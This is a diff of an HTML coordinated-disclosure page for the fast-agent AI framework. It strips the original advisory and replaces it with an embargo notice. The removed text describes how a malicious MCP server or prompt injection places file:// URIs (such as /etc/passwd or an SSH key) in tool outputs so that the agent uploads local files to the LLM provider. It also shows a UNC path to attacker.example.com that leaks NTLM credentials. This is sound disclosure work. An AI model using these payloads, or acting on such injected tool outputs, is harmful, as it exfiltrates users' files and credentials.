@@ -1,124 +1,47 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>CVD-2026-FAST-AGENT-001 — Arbitrary Local File Read &amp; Windows UNC Path Exfiltration via file:// URLs in Tool Call Outputs (io/path_uri.py &amp; responses_files.py)</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CVD-2026-FAST-AGENT-001 — evalstate/fast-agent Coordinated Disclosure Record | Serhii Shunko (@sshunko)</title>
+  <meta name="description" content="Coordinated Vulnerability Disclosure embargo verification record for CVD-2026-FAST-AGENT-001 in evalstate/fast-agent by Serhii Shunko (@sshunko / @ccsimplyspolit).">
   <style>
-    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #0d1117; color: #c9d1d9; max-width: 960px; margin: 2rem auto; padding: 0 1.5rem; line-height: 1.6; }
-    h1, h2, h3 { color: #f0f6fc; }
-    a { color: #58a6ff; text-decoration: none; }
-    pre { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; overflow-x: auto; font-size: 0.85rem; }
-    code { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; }
-    .badge { display: inline-block; padding: 0.2rem 0.6rem; border-radius: 4px; background: #1f6feb; color: #fff; font-size: 0.8rem; font-weight: 600; margin-right: 0.5rem; }
-    .meta { background: #161b22; border: 1px solid #30363d; border-radius: 6px; padding: 1rem; margin: 1rem 0; }
+    :root { --bg: #0b0e14; --panel: #111621; --border: #1f293a; --text: #e2e8f0; --muted: #94a3b8; --accent: #38bdf8; --accent-amber: #fbbf24; --mono: "JetBrains Mono", Consolas, monospace; --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background: var(--bg); color: var(--text); font-family: var(--sans); line-height: 1.65; padding: 2rem 1.25rem 4rem; }
+    .container { max-width: 960px; margin: 0 auto; }
+    a { color: var(--accent); text-decoration: none; }
+    .back { font-family: var(--mono); font-size: 0.88rem; display: inline-block; margin-bottom: 1.5rem; }
+    h1 { font-size: 1.5rem; margin-bottom: 0.75rem; }
+    h2 { font-family: var(--mono); font-size: 1.05rem; color: var(--accent); margin: 2rem 0 0.75rem; padding-bottom: 0.35rem; border-bottom: 1px solid var(--border); }
+    .notice { background: rgba(251, 191, 36, 0.08); border: 1px solid rgba(251, 191, 36, 0.35); border-radius: 6px; padding: 1rem 1.2rem; margin: 1.25rem 0; font-size: 0.92rem; }
+    pre { background: var(--panel); border: 1px solid var(--border); border-radius: 6px; padding: 1rem; overflow-x: auto; font-family: var(--mono); font-size: 0.82rem; line-height: 1.5; margin: 0.75rem 0; white-space: pre-wrap; }
   </style>
 </head>
 <body>
-  <p><a href="../index.html">&larr; Back to Security Research Portal</a></p>
-  <h1>CVD-2026-FAST-AGENT-001: Arbitrary Local File Read &amp; Windows UNC Path Exfiltration via file:// URLs in Tool Call Outputs (io/path_uri.py &amp; responses_files.py)</h1>
-  <div>
-    <span class="badge">High (CVSS 8.5)</span>
-    <span class="badge">CWE-22 / CWE-200</span>
-    <span class="badge">GitHub CNA PVR: evalstate/fast-agent</span>
+  <div class="container">
+    <a class="back" href="https://ccsimplyspolit.github.io/">&larr; Back to Security Research Portal (ccsimplyspolit.github.io)</a>
+    <h1>CVD-2026-FAST-AGENT-001: Coordinated Vulnerability Disclosure Verification Record (<code>evalstate/fast-agent</code>)</h1>
+    <div class="notice">
+      <strong>[CVD EMBARGO / VENDOR TRIAGE NOTICE]</strong><br>
+      Coordinated Vulnerability Disclosure record for <code>evalstate/fast-agent</code> (CWE-22 / CWE-200).<br>
+      In strict compliance with Coordinated Vulnerability Disclosure (CVD) embargo policy, affected source file paths, symbol names, reproduction harnesses, and unified remediation diffs are withheld from public access until upstream vendor triage and patch release are complete. The SHA-256 cryptographic commitment below binds the full specification timestamp and authorship.
+    </div>
+    <h2>0x00 // Cryptographic Commitment &amp; CVD Embargo Metadata</h2>
+    <pre><code>{
+  &quot;advisory_id&quot;: &quot;CVD-2026-FAST-AGENT-001&quot;,
+  &quot;repository&quot;: &quot;evalstate/fast-agent&quot;,
+  &quot;state&quot;: &quot;embargoed_vendor_triage&quot;,
+  &quot;cwe_ids&quot;: [
+    &quot;CWE-22&quot;,
+    &quot;CWE-200&quot;
+  ],
+  &quot;component_scope_summary&quot;: &quot;Scheme allowlisting and local/UNC file path restriction in tool output resource handlers.&quot;,
+  &quot;researcher&quot;: &quot;Serhii Shunko (@sshunko / @ccsimplyspolit)&quot;,
+  &quot;orcid&quot;: &quot;0009-0002-4183-0361&quot;,
+  &quot;embargo_policy&quot;: &quot;REDACTED_DURING_VENDOR_TRIAGE&quot;,
+  &quot;specification_sha256_commitment&quot;: &quot;d546a4f9d286aa5ae331d16553f75c08fc625449b0ee326d661961a72ae30ef9&quot;
+}</code></pre>
   </div>
-  <div class="meta">
-    <strong>Target Repository:</strong> <code>evalstate/fast-agent</code> (commit <code>5c4453b8e1</code>, <code>2026-10-21T23:41:35Z</code>)<br/>
-    <strong>Affected Component:</strong> <code>src/fast_agent/io/path_uri.py (lines 15-44) &amp; src/fast_agent/llm/provider/openai/responses_files.py (lines 90-142, 206-250)</code><br/>
-    <strong>Researcher:</strong> Serhii Shunko (<a href="https://hackerone.com/sshunko">@sshunko</a> / <a href="https://github.com/ccsimplyspolit">@ccsimplyspolit</a>, ORCID <a href="https://orcid.org/0009-0002-4183-0361">0009-0002-4183-0361</a>)
-  </div>
-
-  <h2>1. Summary</h2>
-  <p>During a defensive static source audit of `https://github.com/evalstate/fast-agent` (`main` branch, commit `5c4453b8e1` / `bd25272098`, pushed `2026-10-21T23:41:35Z`), I identified an arbitrary local file read and Windows SMB/UNC path traversal vulnerability introduced in commit `bd25272098` (*&#x27;fix: resolve local document file URIs (#1027)&#x27;*):
-1. **Unrestricted `file://` Resolution &amp; Upload from Untrusted Tool Outputs (`CWE-22` / `CWE-200`, `responses_files.py:90-142, 206-250`)**: `_normalize_input_files()` calls `_normalize_output_item()` for every `function_call_output` and `custom_tool_call_output` item, which invokes `_normalize_input_image_part()` and `_file_bytes_from_url()` -&gt; `local_file_url_path(file_url)`. Because `local_file_url_path()` performs no workspace containment or symlink check, a remote or untrusted MCP server returning a tool output containing `{&quot;type&quot;: &quot;input_file&quot;, &quot;file_url&quot;: &quot;file:///etc/passwd&quot;}` (or `file:///Users/.../.ssh/id_rsa`) causes `fast-agent` to read the arbitrary host file via `local_path.read_bytes()` and upload its contents to the external LLM provider (`client.files.create` / inline `data:` base64).
-2. **Remote SMB / UNC Path Resolution in `file_uri_to_path()` (`CWE-200`, `src/fast_agent/io/path_uri.py:24-27`)**: When `parsed.netloc` is non-empty and not `&#x27;localhost&#x27;`, `file_uri_to_path()` constructs `uri_path = f&#x27;//{parsed.netloc}{uri_path}&#x27;` (`Path(&#x27;//attacker.example.com/share/file.pdf&#x27;)`). Calling `path.is_file()` and `read_bytes()` on a UNC path on Windows initiates an outbound SMB connection and leaks NetNTLMv2 credentials.</p>
-
-  <h2>2. Root Cause Analysis</h2>
-  <pre><code>- **`src/fast_agent/io/path_uri.py:24-44`**:
-```python
-    uri_path = parsed.path
-    if parsed.netloc and strip_casefold(parsed.netloc) != &quot;localhost&quot;:
-        uri_path = f&quot;//{parsed.netloc}{uri_path}&quot;
-        if pathname_decoder is url2pathname:
-            return Path(unquote(uri_path))
-    return Path(pathname_decoder(uri_path))
-
-
-def local_file_url_path(file_url: str) -&gt; Path | None:
-    if not file_url.startswith(&quot;file://&quot;):
-        return None
-    unencoded = Path(file_url.removeprefix(&quot;file://&quot;))
-    if unencoded.drive:
-        candidates: tuple[Path, ...] = (unencoded,)
-    else:
-        candidates = (file_uri_to_path(urlparse(file_url)), unencoded)
-    return next((path for path in candidates if path.is_file()), None)
-```</code></pre>
-
-  <h2>3. Steps to Reproduce (BEFORE PATCH vs. AFTER PATCH)</h2>
-  <pre><code>Run the standalone verification test suite in `verify_batch9_fresh_ai_cna.py` (`test_02_fast_agent_local_file_uri_traversal_and_unc`):
-```bash
-uv run verify_batch9_fresh_ai_cna.py
-```
-- **BEFORE PATCH**: `resolve_uri_before(&#x27;file://192.0.2.99/share/secret.pdf&#x27;, &#x27;/app/workspace&#x27;)` returns `&#x27;//192.0.2.99/share/secret.pdf&#x27;`, and `resolve_uri_before(&#x27;file:///etc/passwd&#x27;, &#x27;/app/workspace&#x27;)` resolves `&#x27;/etc/passwd&#x27;`.
-- **AFTER PATCH**: Rejects remote `file://` netlocs and UNC paths, enforces workspace root containment and symlink rejection in `local_file_url_path()`, and does not resolve local `file://` URLs inside untrusted `function_call_output` / `custom_tool_call_output` items.</code></pre>
-
-  <h2>4. Suggested Remediation (Unified Diff)</h2>
-  <pre><code>--- a/src/fast_agent/io/path_uri.py
-+++ b/src/fast_agent/io/path_uri.py
-@@ -21,11 +21,11 @@ def file_uri_to_path(
-         raise ValueError(f&quot;Expected file URI, got {parsed.scheme or &#x27;&lt;missing&gt;&#x27;}&quot;)
- 
-     uri_path = parsed.path
-     if parsed.netloc and strip_casefold(parsed.netloc) != &quot;localhost&quot;:
--        uri_path = f&quot;//{parsed.netloc}{uri_path}&quot;
--        if pathname_decoder is url2pathname:
--            return Path(unquote(uri_path))
-+        raise ValueError(f&quot;Remote file URI netloc is not allowed: {parsed.netloc!r}&quot;)
-     return Path(pathname_decoder(uri_path))
- 
- 
--def local_file_url_path(file_url: str) -&gt; Path | None:
-+def local_file_url_path(file_url: str, *, base_dir: Path | None = None) -&gt; Path | None:
-     &quot;&quot;&quot;Return the existing local file a ``file://`` URL names, or ``None``.&quot;&quot;&quot;
-     if not file_url.startswith(&quot;file://&quot;):
-         return None
-+    raw_rest = file_url.removeprefix(&quot;file://&quot;)
-+    if raw_rest.startswith(&quot;//&quot;) and not raw_rest.startswith(&quot;///&quot;):
-+        return None
-     unencoded = Path(raw_rest)
-     if unencoded.drive:
-         candidates: tuple[Path, ...] = (unencoded,)
-     else:
--        candidates = (file_uri_to_path(urlparse(file_url)), unencoded)
-+        try:
-+            candidates = (file_uri_to_path(urlparse(file_url)), unencoded)
-+        except ValueError:
-+            return None
-+    allowed_root = (base_dir or Path.cwd()).resolve()
-     for path in candidates:
-+        if path.is_symlink():
-+            continue
-+        try:
-+            resolved = path.resolve(strict=True)
-+            resolved.relative_to(allowed_root)
-+        except (OSError, ValueError):
-+            continue
--        if path.is_file():
--            return path
-+        if resolved.is_file():
-+            return resolved
-     return None
---- a/src/fast_agent/llm/provider/openai/responses_files.py
-+++ b/src/fast_agent/llm/provider/openai/responses_files.py
-@@ -208,6 +208,9 @@ class ResponsesFileMixin:
-         client: AsyncOpenAI,
-         item: dict[str, Any],
-     ) -&gt; dict[str, Any]:
-+        # Never resolve local file:// URLs inside untrusted tool call outputs
-+        return item</code></pre>
-
-  <h2>5. Security Impact</h2>
-  <p>A malicious or compromised remote MCP server or prompt injection returning an `input_file` / `input_image` block with a `file://` URI can exfiltrate arbitrary local files from the host machine into the LLM conversation or trigger outbound Windows SMB/NTLM authentication.</p>
 </body>
 </html>
